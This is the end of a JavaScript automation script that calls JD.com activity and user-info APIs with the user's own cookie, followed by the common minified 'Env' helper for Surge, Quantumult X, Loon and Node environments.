  return {
    url: `https://api.m.jd.com/?appid=activities_platform&functionId=${function_id}&body=${escape(JSON.stringify(body))}&t=${+new Date()}`,
    headers: {
      'Cookie': cookie,
      'Host': 'api.m.jd.com',
      'Accept': '*/*',
      'Connection': 'keep-alive',
      'user-agent': $.isNode() ? (process.env.JS_USER_AGENT ? process.env.JS_USER_AGENT : (require('./JS_USER_AGENTS').USER_AGENT)) : ($.getdata('JSUA') ? $.getdata('JSUA') : "'jdltapp;iPad;3.1.0;14.4;network/wifi;Mozilla/5.0 (iPad; CPU OS 14_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148;supportJDSHWK/1"),
      'Accept-Language': 'zh-Hans-CN;q=1,en-CN;q=0.9',
      'Accept-Encoding': 'gzip, deflate, br',
      'Content-Type': "application/x-www-form-urlencoded",
      "referer": "https://an.jd.com/babelDiy/Zeus/q1eB6WUB8oC4eH1BsCLWvQakVsX/index.html"
    }
  }
}
function TotalBean() {
  return new Promise(async resolve => {
    const options = {
      "url": `https://wq.jd.com/user/info/QueryJDUserInfo?sceneval=2`,
      "headers": {
        "Accept": "application/json,text/plain, */*",
        "Content-Type": "application/x-www-form-urlencoded",
        "Accept-Encoding": "gzip, deflate, br",
        "Accept-Language": "zh-cn",
        "Connection": "keep-alive",
        "Cookie": cookie,
        "Referer": "https://wqs.jd.com/my/jingdou/my.shtml?sceneval=2",
        "User-Agent": $.isNode() ? (process.env.JD_USER_AGENT ? process.env.JD_USER_AGENT : (require('./USER_AGENTS').USER_AGENT)) : ($.getdata('JDUA') ? $.getdata('JDUA') : "jdapp;iPhone;9.2.2;14.2;%E4%BA%AC%E4%B8%9C/9.2.2 CFNetwork/1206 Darwin/20.1.0")
      }
    }
    $.post(options, (err, resp, data) => {
      try {
        if (err) {
          console.log(`${JSON.stringify(err)}`)
          console.log(`${$.name} API请求失败，请检查网路重试`)
        } else {
          if (data) {
            data = JSON.parse(data);
            if (data['retcode'] === 13) {
              $.isLogin = false; //cookie过期
              return
            }
            $.nickName = data['base'].nickname;
          } else {
            console.log(`京东服务器返回空数据`)
          }
        }
      } catch (e) {
        $.logErr(e, resp)
      } finally {
        resolve();
      }
    })
  })
}

function safeGet(data) {
  try {
    if (typeof JSON.parse(data) == "object") {
      return true;
    }
  } catch (e) {
    console.log(e);
    console.log(`京东服务器访问数据为空，请检查自身设备网络情况`);
    return false;
  }
}

function jsonParse(str) {
  if (typeof str == "string") {
    try {
      return JSON.parse(str);
    } catch (e) {
      console.log(e);
      $.msg($.name, '', '请勿随意在BoxJs输入框修改内容\n建议通过脚本去获取cookie')
      return [];
    }
  }
}
// prettier-ignore
function Env(t,e){class s{constructor(t){this.env=t}send(t,e="GET"){t="string"==typeof t?{url:t}:t;let s=this.get;return"POST"===e&&(s=this.post),new Promise((e,i)=>{s.call(this,t,(t,s,r)=>{t?i(t):e(s)})})}get(t){return this.send.call(this.env,t)}post(t){return this.send.call(this.env,t,"POST")}}return new class{constructor(t,e){this.name=t,this.http=new s(this),this.data=null,this.dataFile="box.dat",this.logs=[],this.isMute=!1,this.isNeedRewrite=!1,this.logSeparator="\n",this.startTime=(new Date).getTime(),Object.assign(this,e),this.log("",`🔔${this.name}, 开始!`)}isNode(){return"undefined"!=typeof module&&!!module.exports}isQuanX(){return"undefined"!=typeof $task}isSurge(){return"undefined"!=typeof $httpClient&&"undefined"==typeof $loon}isLoon(){return"undefined"!=typeof $loon}toObj(t,e=null){try{return JSON.parse(t)}catch{return e}}toStr(t,e=null){try{return JSON.stringify(t)}catch{return e}}getjson(t,e){let s=e;const i=this.getdata(t);if(i)try{s=JSON.parse(this.getdata(t))}catch{}return s}setjson(t,e){try{return this.setdata(JSON.stringify(t),e)}catch{return!1}}getScript(t){return new Promise(e=>{this.get({url:t},(t,s,i)=>e(i))})}runScript(t,e){return new Promise(s=>{let i=this.getdata("@chavy_boxjs_userCfgs.httpapi");i=i?i.replace(/\n/g,"").trim():i;let r=this.getdata("@chavy_boxjs_userCfgs.httpapi_timeout");r=r?1*r:20,r=e&&e.timeout?e.timeout:r;const[o,h]=i.split("@"),n={url:`http://${h}/v1/scripting/evaluate`,body:{script_text:t,mock_type:"cron",timeout:r},headers:{"X-Key":o,Accept:"*/*"}};this.post(n,(t,e,i)=>s(i))}).catch(t=>this.logErr(t))}loaddata(){if(!this.isNode())return{};{this.fs=this.fs?this.fs:require("fs"),this.path=this.path?this.path:require("path");const t=this.path.resolve(this.dataFile),e=this.path.resolve(process.cwd(),this.dataFile),s=this.fs.existsSync(t),i=!s&&this.fs.existsSync(e);if(!s&&!i)return{};{const i=s?t:e;try{return JSON.parse(this.fs.readFileSync(i))}catch(t){return{}}}}}writedata(){if(this.isNode()){this.fs=this.fs?this.fs:require("fs"),this.path=this.path?this.path:require("path");const t=this.path.resolve(this.dataFile),e=this.path.resolve(process.cwd(),this.dataFile),s=this.fs.existsSync(t),i=!s&&this.fs.existsSync(e),r=JSON.stringify(this.data);s?this.fs.writeFileSync(t,r):i?this.fs.writeFileSync(e,r):this.fs.writeFileSync(t,r)}}lodash_get(t,e,s){const i=e.replace(/\[(\d+)\]/g,".$1").split(".");let r=t;for(const t of i)if(r=Object(r)[t],void 0===r)return s;return r}lodash_set(t,e,s){return Object(t)!==t?t:(Array.isArray(e)||(e=e.toString().match(/[^.[\]]+/g)||[]),e.slice(0,-1).reduce((t,s,i)=>Object(t[s])===t[s]?t[s]:t[s]=Math.abs(e[i+1])>>0==+e[i+1]?[]:{},t)[e[e.length-1]]=s,t)}getdata(t){let e=this.getval(t);if(/^@/.test(t)){const[,s,i]=/^@(.*?)\.(.*?)$/.exec(t),r=s?this.getval(s):"";if(r)try{const t=JSON.parse(r);e=t?this.lodash_get(t,i,""):e}catch(t){e=""}}return e}setdata(t,e){let s=!1;if(/^@/.test(e)){const[,i,r]=/^@(.*?)\.(.*?)$/.exec(e),o=this.getval(i),h=i?"null"===o?null:o||"{}":"{}";try{const e=JSON.parse(h);this.lodash_set(e,r,t),s=this.setval(JSON.stringify(e),i)}catch(e){const o={};this.lodash_set(o,r,t),s=this.setval(JSON.stringify(o),i)}}else s=this.setval(t,e);return s}getval(t){return this.isSurge()||this.isLoon()?$persistentStore.read(t):this.isQuanX()?$prefs.valueForKey(t):this.isNode()?(this.data=this.loaddata(),this.data[t]):this.data&&this.data[t]||null}setval(t,e){return this.isSurge()||this.isLoon()?$persistentStore.write(t,e):this.isQuanX()?$prefs.setValueForKey(t,e):this.isNode()?(this.data=this.loaddata(),this.data[e]=t,this.writedata(),!0):this.data&&this.data[e]||null}initGotEnv(t){this.got=this.got?this.got:require("got"),this.cktough=this.cktough?this.cktough:require("tough-cookie"),this.ckjar=this.ckjar?this.ckjar:new this.cktough.CookieJar,t&&(t.headers=t.headers?t.headers:{},void 0===t.headers.Cookie&&void 0===t.cookieJar&&(t.cookieJar=this.ckjar))}get(t,e=(()=>{})){t.headers&&(delete t.headers["Content-Type"],delete t.headers["Content-Length"]),this.isSurge()||this.isLoon()?(this.isSurge()&&this.isNeedRewrite&&(t.headers=t.headers||{},Object.assign(t.headers,{"X-Surge-Skip-Scripting":!1})),$httpClient.get(t,(t,s,i)=>{!t&&s&&(s.body=i,s.statusCode=s.status),e(t,s,i)})):this.isQuanX()?(this.isNeedRewrite&&(t.opts=t.opts||{},Object.assign(t.opts,{hints:!1})),$task.fetch(t).then(t=>{const{statusCode:s,statusCode:i,headers:r,body:o}=t;e(null,{status:s,statusCode:i,headers:r,body:o},o)},t=>e(t))):this.isNode()&&(this.initGotEnv(t),this.got(t).on("redirect",(t,e)=>{try{if(t.headers["set-cookie"]){const s=t.headers["set-cookie"].map(this.cktough.Cookie.parse).toString();s&&this.ckjar.setCookieSync(s,null),e.cookieJar=this.ckjar}}catch(t){this.logErr(t)}}).then(t=>{const{statusCode:s,statusCode:i,headers:r,body:o}=t;e(null,{status:s,statusCode:i,headers:r,body:o},o)},t=>{const{message:s,response:i}=t;e(s,i,i&&i.body)}))}post(t,e=(()=>{})){if(t.body&&t.headers&&!t.headers["Content-Type"]&&(t.headers["Content-Type"]="application/x-www-form-urlencoded"),t.headers&&delete t.headers["Content-Length"],this.isSurge()||this.isLoon())this.isSurge()&&this.isNeedRewrite&&(t.headers=t.headers||{},Object.assign(t.headers,{"X-Surge-Skip-Scripting":!1})),$httpClient.post(t,(t,s,i)=>{!t&&s&&(s.body=i,s.statusCode=s.status),e(t,s,i)});else if(this.isQuanX())t.method="POST",this.isNeedRewrite&&(t.opts=t.opts||{},Object.assign(t.opts,{hints:!1})),$task.fetch(t).then(t=>{const{statusCode:s,statusCode:i,headers:r,body:o}=t;e(null,{status:s,statusCode:i,headers:r,body:o},o)},t=>e(t));else if(this.isNode()){this.initGotEnv(t);const{url:s,...i}=t;this.got.post(s,i).then(t=>{const{statusCode:s,statusCode:i,headers:r,body:o}=t;e(null,{status:s,statusCode:i,headers:r,body:o},o)},t=>{const{message:s,response:i}=t;e(s,i,i&&i.body)})}}time(t,e=null){const s=e?new Date(e):new Date;let i={"M+":s.getMonth()+1,"d+":s.getDate(),"H+":s.getHours(),"m+":s.getMinutes(),"s+":s.getSeconds(),"q+":Math.floor((s.getMonth()+3)/3),S:s.getMilliseconds()};/(y+)/.test(t)&&(t=t.replace(RegExp.$1,(s.getFullYear()+"").substr(4-RegExp.$1.length)));for(let e in i)new RegExp("("+e+")").test(t)&&(t=t.replace(RegExp.$1,1==RegExp.$1.length?i[e]:("00"+i[e]).substr((""+i[e]).length)));return t}msg(e=t,s="",i="",r){const o=t=>{if(!t)return t;if("string"==typeof t)return this.isLoon()?t:this.isQuanX()?{"open-url":t}:this.isSurge()?{url:t}:void 0;if("object"==typeof t){if(this.isLoon()){let e=t.openUrl||t.url||t["open-url"],s=t.mediaUrl||t["media-url"];return{openUrl:e,mediaUrl:s}}if(this.isQuanX()){let e=t["open-url"]||t.url||t.openUrl,s=t["media-url"]||t.mediaUrl;return{"open-url":e,"media-url":s}}if(this.isSurge()){let e=t.url||t.openUrl||t["open-url"];return{url:e}}}};if(this.isMute||(this.isSurge()||this.isLoon()?$notification.post(e,s,i,o(r)):this.isQuanX()&&$notify(e,s,i,o(r))),!this.isMuteLog){let t=["","==============📣系统通知📣=============="];t.push(e),s&&t.push(s),i&&t.push(i),console.log(t.join("\n")),this.logs=this.logs.concat(t)}}log(...t){t.length>0&&(this.logs=[...this.logs,...t]),console.log(t.join(this.logSeparator))}logErr(t,e){const s=!this.isSurge()&&!this.isQuanX()&&!this.isLoon();s?this.log("",`❗️${this.name}, 错误!`,t.stack):this.log("",`❗️${this.name}, 错误!`,t)}wait(t){return new Promise(e=>setTimeout(e,t))}done(t={}){const e=(new Date).getTime(),s=(e-this.startTime)/1e3;this.log("",`🔔${this.name}, 结束! 🕛 ${s} 秒`),this.log(),(this.isSurge()||this.isQuanX()||this.isLoon())&&$done(t)}}(t,e)}